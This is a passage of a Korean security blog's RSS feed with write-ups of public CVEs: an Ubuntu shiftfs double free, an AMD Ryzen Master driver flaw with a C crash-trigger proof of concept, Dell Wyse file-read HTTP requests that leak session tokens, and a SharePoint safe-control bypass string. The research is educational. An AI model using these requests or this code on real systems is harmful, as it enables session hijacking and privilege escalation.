      <comments>https://hackyboiz.github.io/2021/07/16/j0ker/2021-07-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-3492: Ubuntu Shiftfs driver double free vulnerability</title>
      <link>https://hackyboiz.github.io/2021/07/15/idioth/2021-07-15/</link>
      <guid>https://hackyboiz.github.io/2021/07/15/idioth/2021-07-15/</guid>
      <pubDate>Thu, 15 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.synacktiv.com/publications/exploitation-of-a-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.synacktiv.com/publications/exploitation-of-a-double-free-vulnerability-in-ubuntu-shiftfs-driver-cve-2021-3492.html">EXPLOITATION OF A DOUBLE FREE VULNERABILITY IN UBUNTU SHIFTFS DRIVER (CVE-2021-3492)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu Groovy (20.10, kernel 5.8.0-50.56 이전 버전)</li><li>Ubuntu Focal (20.04, kernel 5.4.0-72.80 이전 버전)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Pwn2Own Vancouver 2021에서 Ubuntu Groovy (20.10)과 Ubuntu Focal (20.04)의 Shiftfs 드라이버에서 double free 버그가 발견되었습니다.</p><p>shiftfs는 파일 시스템 드라이버로 디렉터리를 bind-mount 하고 마운트한 user namespace owner의 맵을 통해 UID와 GID를 shift 할 수 있는 overlay 종류의 파일 시스템입니다. shiftfs는 특정 ioctl로 핸들링되며 허용된 ioctl을 전달받을 시 <code>shiftfs_real_ioctl</code>을 호출합니다. <code>BTRFS_IOC_SNAP_CREATE</code> ioctl이 사용되면 <code>shiftfs_btrfs_ioctl_fd_replace</code> 함수는 userspace에서 kernel space로 구조체를 복사하여 <code>btrfs_ioctl_vol_args</code> 구조체에 포함된 파일 디스크립터를 bottom 파일 시스템의 inode에 연결된 새 디스크립터로 교체하여 legacy btrfs ioctl을 래핑합니다.</p><p>이 ioctl이 shiftfs 파일에서 수행되면 핸들링 코드는 <code>btrfs_ioctl_vol_args</code>를 userpsace에서 kernel space로 복사합니다. 이 구조체에서 <code>fd</code>를 교체한 후 다시 userspace로 복사됩니다. 복사가 실패할 경우, <code>copy_to_user</code> 함수는 남아있는 바이트를 반환하여 양수 값을 반환합니다. 해당 함수를 호출하는 <code>shiftfs_real_ioctl</code>은 음수 값인지 확인하여 오류가 났는지 확인하여 오류가 발생하더라도 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 다른 <code>copy_to_user</code>를 실행하고 <code>btrfs_ioctl_vol_args</code> 구조체를 userpace로 보낸 다음 free 합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_restore</code>를 두 번 호출하면 같은 fd를 두 번 닫고 같은 구조체가 두 번 free 됩니다. 해당 구조체는 userspace에서 복사되는 동안 <code>shiftfs_btrfs_ioctl_fd_replace</code>에 할당되며 커널 함수 <code>memdup_user</code>는 <code>copy_from_user</code>와 동시에 할당합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_replace</code> 함수에서 <code>memdup_user</code>가 할당에 성공하고 <code>copy_to_user</code>는 실패하면 <code>shiftfs_btrfs_ioctl_fd_restore</code>에서 <code>kfree</code>를 호출하여 첫 번째 free를 진행하고 <code>shiftfs_real_ioctl</code>에서 다시 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 Potential leak과 <code>kfree</code>를 통한 두 번째 free가 가능하여 double free bug가 발생합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/double-free-bug/">double free bug</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/ubuntu/">ubuntu</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/15/idioth/2021-07-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 공대오빠가 알려주는 Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master 분석(1)</title>
      <link>https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/</link>
      <guid>https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/</guid>
      <pubDate>Wed, 14 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요! 한 달 만에 돌아온 윈도우 드라이버 시리즈입니다. 지난번 커널 디버깅 세팅에 이어 본격적으로 윈도우 third-party 드라이버 원데이를 분석해볼 건데요, 이제 보니까 시리즈 제목을 뭐같이 짓긴 했네요. 내가 왜 저랬을까..? &lt;/</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요! 한 달 만에 돌아온 윈도우 드라이버 시리즈입니다. 지난번 커널 디버깅 세팅에 이어 본격적으로 윈도우 third-party 드라이버 원데이를 분석해볼 건데요, 이제 보니까 시리즈 제목을 뭐같이 짓긴 했네요. 내가 왜 저랬을까..? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled.png" alt="windows-driver-part2/Untitled.png"></p><blockquote><p>다음 파트는 공대 “아저씨”가 알려주는 드라이버 취약점으로 돌아오겠습니다…</p></blockquote><h1 id="AMD-Ryzen-Master"><a href="#AMD-Ryzen-Master" class="headerlink" title="AMD Ryzen Master"></a>AMD Ryzen Master</h1><p><img src="/2021/07/14/l0ch/windows-driver-part2/AMD.png" alt="windows-driver-part2/AMD.png"></p><p>오늘 분석할 AMD Ryzen Master는 라이젠 CPU를 사용하시는 분들 중 오버클럭에 관심이 있다면 들어보셨을 익숙한 유틸리티입니다! 저도 작년에 라이젠 CPU를 처음 사서 인생 첫 오버클럭을 하려고 했는데, 바이오스 메뉴에서 뭘 어떻게 해야 할지 몰라서 얼타다가 마우스 클릭 몇 번에 오버클럭이 짠 하고 된다길래 유용하게 썼었죠. 물론 재부팅할 때마다 설정 적용해줘야 하는 게 귀찮아서 결국 바이오스에서 설정했습니다 ㅋㅋ!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%201.png" alt="windows-driver-part2/Untitled%201.png"></p><blockquote><p>오버클럭도 못하는 컴알못ㅜ</p></blockquote><p>이건 여담인데, 지금 쓰는 CPU가 오버클럭 안한 순정상태에서는 블루스크린 뜨는데 오버클럭 하면 멀쩡하더라구요. 수율이 좋길래 그냥 쓰고 있는데.. 뭔가 찝찝한 건 기분 탓일 거야 아마</p><blockquote><p>본인(새컴 맞춰서 신남) : 님들 시퓨 순정은 블루스크린 뜨는데 오버클럭 하면 잘 돌아감 ㅋㅋ 신기하죠<br>??? : 우린 그걸 초기 불량이라고 부르기로 했어요.</p></blockquote><p>…? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%202.png" alt="windows-driver-part2/Untitled%202.png"></p><blockquote><p>그래도 1년째 잘 쓰고 있습니다..</p></blockquote><p>아무튼 오늘은 작년에 공개된 AMD Ryzen Master의 권한상승 취약점 CVE-2020-12928 을 분석해보도록 하겠습니다! OS환경은 Windows 10 빌드 19043.1083에서, 타겟인 AMD Ryzen Master는 취약한 AMDRyzenMasterDriverV15 버전의 드라이버가 포함된  2.1.1.1472 버전에서 진행했습니다. </p><p>구버전 찾는데 하루 종일 걸려버림 ㅎㅎ. .</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%203.png" alt="windows-driver-part2/Untitled%203.png"></p><blockquote><p>아 구버전 구하기 진짜 너무 어려웠다 ㅁㄴㅇㄹㄴㅇㅁㄹㅇㅁ</p></blockquote><p>이제.. 설치하고 설치 경로를 찾아가보면</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip.png" alt="windows-driver-part2/tempsnip.png"></p><p>오늘의 주인공 드라이버는 위 경로에서 찾을 수 있습니다.</p><h1 id="Kernel-Driver-Driver-Exploit"><a href="#Kernel-Driver-Driver-Exploit" class="headerlink" title="Kernel Driver / Driver Exploit"></a>Kernel Driver / Driver Exploit</h1><p>본격적으로 분석을 하기 전에 드라이버가 어떤 것인지, 취약점에는 어떤 것이 있는지부터 알아봐야 합니다.</p><p>Windows Kernel은 모듈화가 되어 있으며 Core Kernel(Microkernel)과 Device Driver 두 가지로 나눌 수 있습니다. Core 모듈에는 Kernel의 핵심적인 기능이 구현되어 있고 대부분의 커널 기능은 driver 형태로 모듈화 되어 구현됩니다. 이러한 모듈화의 장점은 확장성과 유지보수가 용이하다는 점이 있겠네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%204.png" alt="windows-driver-part2/Untitled%204.png"></p><blockquote><p>Windows NT 계열의 커널 아키텍처</p></blockquote><p>Windows에서 드라이버는 특정 이벤트가 발생할 때 커널 컨텍스트에서 실행되는 코드를 포함하는 모듈로 정의할 수 있습니다. 정리하면 커널 권한이 필요한 작업이 필요할 때 실행되는 코드를 모듈화 한 것입니다.  </p><p>위 사진에서 볼 수 있듯이 Windows는 User mode와 Kernel mode로 권한이 나뉘어 있습니다. User mode에서 실행되는 어플리케이션이 커널 권한이 필요한 작업을 요구할 때 커널 권한에 직접적으로 접근하는 것이 아닌 커널 권한으로 실행되는 드라이버에게 요청을 보내 간접적으로 수행하는 것이죠. 이때 User mode 어플리케이션은 I/O Manger를 통해 드라이버에게 요청을 보내는데, IOCTL(I/O Control) 코드로 드라이버가 어떤 기능을 수행할지를 결정합니다.</p><p>그렇다면, 이런 드라이버에서 찾을 수 있는 취약점은 어떤 것이 있을지 감이 오지 않나요?</p><p>드라이버의 취약점 공격에 성공하면 유저 권한의 어플리케이션으로는 할 수 없는 높은 권한에서의 임의 명령어 실행이 가능하고 타겟에게 더 큰 피해를 끼칠 수 있습니다. 이를 권한 상승 취약점(Privilege Escalation)이라고 부릅니다.</p><p>그런데 Microsoft가 바보도 아니고 커널 권한으로 돌아가는 드라이버는 좀 더 보안에 신경을 써서 개발했을 거 같지 않나요? 문제는 이 드라이버는 MS가 아닌 제삼자(third-party)도 개발하고 배포할 수 있어 발생합니다. </p><p>third-party driver는 보통 커널 레벨의 높은 권한을 요구하는 백신이나 하드웨어를 직접 제어하는 마우스, 모니터 드라이버, 하드웨어 모니터링 등의 제조사 유틸리티에서 많이 사용합니다. Microsoft가 Windows 커널과 자기네 드라이버를 아무리 심혈을 기울여 버그 없이 내놓는다고 해도 이런 third-party driver들이 있는 한 권한 상승 취약점은 팡팡 터질 것 같네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%205.png" alt="windows-driver-part2/Untitled%205.png"></p><blockquote><p>요즘 핫한 PrintNightmare같은 프린터 스풀러 취약점이 터지는 거 보면 마소도 뭐.. 갈 길이 먼 것 같지만요 ㅎㅎ;;</p></blockquote><p>오늘 글을 보기 전 드라이버 익스플로잇에 대한 아래 번역글을 읽어보면 도움이 됩니다!</p><p><a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">[Translation] Exploiting System Mechanic Driver Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/04/28/l0ch/exploiting-driver-part2/">[Translation] Exploiting System Mechanic Driver Part 2</a></p><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>이제 본격적으로 취약점을 분석해볼 차례입니다! 먼저 드라이버 서비스가 동작중인지 확인부터 해보겠습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/2.png" alt="windows-driver-part2/2.png"></p><p>WinObj로 확인해보면 AMDRyzenMasterDriverV15 디바이스가 올라온 것을 볼 수 있네요. </p><p><code>AMDRyzenMasterDriverV15.sys</code> 를 IDA로 열자마자 바로 <code>DriverEntry</code> 부터 찾아보죠</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%206.png" alt="windows-driver-part2/Untitled%206.png"></p><p><code>sub_140008A5C</code>로 가볼까요?</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip%201.png" alt="windows-driver-part2/tempsnip%201.png"></p><p><code>DriverEntry</code>에서 첫 번째 매개변수로 <code>PDRIVER_OBJECT</code> 를 줬으니 매개변수 <code>a1</code>의 type을 <code>PDRIVER_OBJECT</code>로 변환합니다. 여기선 dispatch routine을 찾을 수 없네요.  <code>PDRIVER_OBJECT</code>를 매개변수로 전달하는 함수를 더 찾아보겠습니다. <code>sub_1400046AC</code>를 볼까요? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip2.png" alt="windows-driver-part2/tempsnip2.png"></p><p>이번에는 <code>DRIVER_OBJECT-&gt;MajorFunction[14]</code>에 dispatch routine을 할당하는 코드를 찾을 수 있습니다! 장치명도 보이네요. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%207.png" alt="windows-driver-part2/Untitled%207.png"></p><p>dispatch routine에는 IOCTL 코드와 코드 별 루틴을 볼 수 있습니다.</p><h2 id="MmMapIoSpace"><a href="#MmMapIoSpace" class="headerlink" title="MmMapIoSpace"></a>MmMapIoSpace</h2><p>이제 함수 하나를 중점적으로 보면서 취약점을 찾아볼 텐데요, 타겟은 <code>MmMapIoSpace</code>로 정하겠습니다! <code>MmMapIoSpace</code>는 물리 주소를 가상 페이지 주소에 매핑하는 함수로, 함수 원형은 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">MmMapIoSpace</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  PHYSICAL_ADDRESS    PhysicalAddress,  <span class="hljs-comment">// 매핑할 물리적 주소</span></span></span><span class="hljs-function"><span class="hljs-params">  SIZE_T              NumberOfBytes,   <span class="hljs-comment">//매핑할 바이트 수</span></span></span><span class="hljs-function"><span class="hljs-params">  MEMORY_CACHING_TYPE CacheType       <span class="hljs-comment">//매핑하는 데 사용할 캐시 속성을 나타내는 MEMORY_CACHING_TYPE 값</span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>왠지 이 함수 매개변수를 제어할 수 있으면 아주 좋은 공격 벡터가 될 것 같죠? </p><p><code>MmMapIoSpace</code> 관련 취약점은 MSI Dragon Center 권한상승을 다루는 하루한줄(<a href="https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/">CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</a>) 에서도 언급된 적이 있었습니다. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%208.png" alt="windows-driver-part2/Untitled%208.png"></p><blockquote><p>이때 오늘 글 예고를 하기도 했었죠 ㅎㅎ</p></blockquote><p><img src="/2021/07/14/l0ch/windows-driver-part2/33.png" alt="windows-driver-part2/33.png"></p><p>cross reference view로 본 <code>MmMapIoSpace</code>를 호출하는 함수 리스트입니다. <code>sub_140007278</code> 함수를 보도록 할게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%209.png" alt="windows-driver-part2/Untitled%209.png"></p><p>코드를 보고 분석해보면 간단하게 다음과 같이 정리가 가능합니다.</p><ul><li><code>MmMapIoSpace</code> 함수에 매개변수 <code>a1</code>와 <code>a2</code>를 각각 매핑하길 원하는 물리 주소와 길이를 전달합니다.</li><li><code>BaseAddress</code>에는 <code>MmMapIoSpace</code>의 반환 값인 물리 주소가 매핑된 가상 페이지 주소가 들어갑니다.</li><li><code>BaseAddress</code>가 NULL인지 확인하고 아니면 <code>NumberOfBytes</code>만큼 <code>a3</code> 버퍼의 값을 복사합니다.</li><li>복사가 완료되면 매핑된 주소를 매핑 해제하고 정상적으로 종료됩니다.</li></ul><p>해당 함수는 커널 메모리에 바이트 단위로 무언가를 쓰는 루틴으로 보입니다. 함수를 호출하는 dispatch routine으로 올라가 볼게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2010.png" alt="windows-driver-part2/Untitled%2010.png"></p><p>IOCTL 코드가 <code>0x81112F0C</code>일때 함수를 호출하네요. </p><p><code>MmMapIoSpace</code>를 호출하는 다른 함수인 <code>sub_1400063D0</code>을 보겠습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2011.png" alt="windows-driver-part2/Untitled%2011.png"></p><p>위 함수는 비슷해 보이긴 하지만 한 가지가 다르네요?  <code>sub_140007278</code> 함수와 반대로 커널 메모리를 바이트 단위로 쓰는 루틴인 것 같습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2012.png" alt="windows-driver-part2/Untitled%2012.png"></p><p>IOCTL <code>0x81112F08</code>일 때 해당 함수 루틴을 수행합니다.</p><p>위 두 함수의 <code>MmMapIoSpace</code> 로 전달되는 매개변수와 복사할 메모리 주소를 제어할 수 있으면 임의 쓰기 및 임의 읽기가 가능할 것 같다는 느낌적인 느낌이 오지 않나요?! 바로 테스트를 해볼게요.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    HANDLE dHandle;    WCHAR DeviceLink[] = <span class="hljs-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span>;    DWORD dwRet = <span class="hljs-number">0</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>,        <span class="hljs-number">0x100c</span>,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE);    dHandle = CreateFileW(        DeviceLink,        GENERIC_READ | GENERIC_WRITE,        <span class="hljs-number">0</span>,        <span class="hljs-literal">NULL</span>,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL,        <span class="hljs-literal">NULL</span>    );    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail! : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;        BYTE input_buff[<span class="hljs-number">0x100</span>] = &#123; <span class="hljs-number">0</span>, &#125;;    <span class="hljs-keyword">if</span> (!DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeviceIOControl Fail : 0x%X \n&quot;</span>, GetLastError());        CloseHandle(dHandle);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>위 코드에 대해서는 다음 파트에서 자세하게 설명하기로 하고, 지금은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">DeviceIoControl</a> 를 호출하는 부분만 보면 됩니다.</p><pre><code class="hljs c">DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>)</code></pre><p>IOCTL code <code>0x81112F0C</code> 로 요청을 보내는데 input buffer와 output buffer를 사이즈와 함께 전달합니다. 여기서는 input buffer 내용을 모두 NULL로 채워서 전달했습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/BSOD.png" alt="windows-driver-part2/BSOD.png"></p><blockquote><p>블루스크린 겟!  : )</p></blockquote><p>다음 파트에서는 파트 1의 커널 디버깅으로 크래시를 동적 분석한 뒤 익스플로잇까지 해보도록 하겠습니다. 다음에 만나요 안녕!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-driver/">windows driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/third-party-driver-exploitation/">third-party driver exploitation</category>
      
      <category domain="https://hackyboiz.github.io/tags/amd/">amd</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-21586/21587: Dell Wyse Management Suite Arbitrary File Read</title>
      <link>https://hackyboiz.github.io/2021/07/13/l0ch/2021-07-13/</link>
      <guid>https://hackyboiz.github.io/2021/07/13/l0ch/2021-07-13/</guid>
      <pubDate>Tue, 13 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://research.nccgroup.com/2021/07/06/technical-adviso</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2021/07/06/technical-advisory-arbitrary-file-read-in-dell-wyse-management-suite-cve-2021-21586-cve-2021-21587/">Technical Advisory – Arbitrary File Read in Dell Wyse Management Suite (CVE-2021-21586, CVE-2021-21587)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Wyse Management Suit &lt; 3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell의 클라우드 엔드포인트 관리 솔루션인 Wyse Management Suite(WMS)에서 데이터베이스 파일을 포함한 Arbitrary File Read 취약점의 세부 정보가 공개되었습니다.</p><p>WMS의 <code>/ccm-web/image/os</code> 는 <code>filePath</code>와 <code>fileName</code> 매개변수를 받아 시스템 경로에서 파일을 검색합니다. 장치 ID를 사용해 유효하지 않은 요청을 보내면 다음과 같이 오류 메세지를 반환합니다.</p><pre><code class="hljs c">PUT /ccm-web/image/pull/a/b HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span>-HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> Cache-Control: <span class="hljs-keyword">private</span>Expires: Thu, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT...C:\Program Files\DELL\Software\repository\imagePull\staging\a\b (The system cannot find the path specified)</code></pre><p>오류 메세지에서 WMS가 설치된 시스템의 경로가 노출되며 아래와 같이 세션 토큰이 있는 MySQL 데이터베이스 테이블인 <code>[PATH]\DELL\WMS\Database\SQL\stratus\persistentlogin.ibd</code> 파일에서 JSESSIONID 값을 추출할 수 있고 이는 세션 하이재킹으로 이어질 수 있습니다.</p><pre><code class="hljs c">GET /ccm-web/image/os?filePath=C:\Program Files\DELL\WMS\Database\SQL\stratus&amp;fileName=persistentlogin.ibd HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span></code></pre><p>해당 취약점을 악용하면 관리 인터페이스의 BIOS 패스워드 재설정 및 VNC를 통한 원격 터미널 등의 기능에 액세스할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-read/">arbitrary file read</category>
      
      <category domain="https://hackyboiz.github.io/tags/dell/">dell</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/13/l0ch/2021-07-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-28474: SharePoint Interpretation conflict RCE</title>
      <link>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/</link>
      <guid>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/</guid>
      <pubDate>Mon, 12 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-28474-sharepoint-remote-code-execution-via-server-side-control-interpretation-conflict">CVE-2021-28474: SHAREPOINT REMOTE CODE EXECUTION VIA SERVER-SIDE CONTROL INTERPRETATION CONFLICT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft SharePoint Server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft SharPoint Server에서 발생하는 원격 코드 실행 취약점이 패치되어 write-up이 공개되었습니다. 보안 확인에 사용되는 코드와 실제로 사용자 입력을 처리하는 코드 간의 불일치로 발생하는 취약점입니다. 인증된 SharePoint 사용자는 해당 취약점을 악용해 임의의 .NET 코드를 실행 할 수 있습니다.</p><p><code>EditingPageParser.VerifyControlOnSafeList()</code> 함수는 server-side control(<code>runat=&quot;server&quot;</code> attribute가 있는 tag)에 해당하는 input을 파싱해 해쉬 테이블을 만들고 그 값들을 <code>web.config</code> 파일과 비교하여 안전한 control 인지 확인합니다.</p><p>문제는 control을 처리할 땐 파서가 attribute를 HTML-decode 하지만, verification 작업에선 HTML-decode를 하지 않습니다. 따라서 <code>runat=&quot;&amp;#115;erver&quot;</code>와 같은 ASPX tag attribute를 사용하면 verification 시 server-side control로 인식되지 않아 bypass 할 수 있습니다. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/conflict/">conflict</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/12/fabu1ous/2021-07-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</title>
      <link>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/</link>
      <guid>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/</guid>
      <pubDate>Sun, 11 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;strong&gt;다른 파트 보러가기&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/&quot;&gt;Re:versing으로 시작하는 ghidra 생활 Part</description>
        
      
      
      
      <content:encoded><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2) (Here!)</p><hr><p>안녕하세요. idioth입니다. 여러모로 일정이 딜레이가 되어서 이번 파트를 작성하는데 꽤 오랜 시간이 걸렸네요. 이번 게시글에서는 ataware 랜섬웨어의 ATAPIConfiguration 부분에 대해 분석할 예정이에요. 세 개의 바이너리 (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)를 분석한다고 하였지만, 사용하는 기능 자체가 크게 다르지 않고 악성코드 분석에 치중되는 것 같아 이번 파트를 마지막으로 ghidra 시리즈는 완료될 예정입니다.</p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>저번 게시글에서 ATAPIinit 바이너리가 <code>dropboxusercontent</code> 링크에 접속하여 ATAPIConfiguration을 다운로드하는 것을 확인했습니다. 해당 링크는 현재 비활성화되어 있으므로 바이너리는 <a 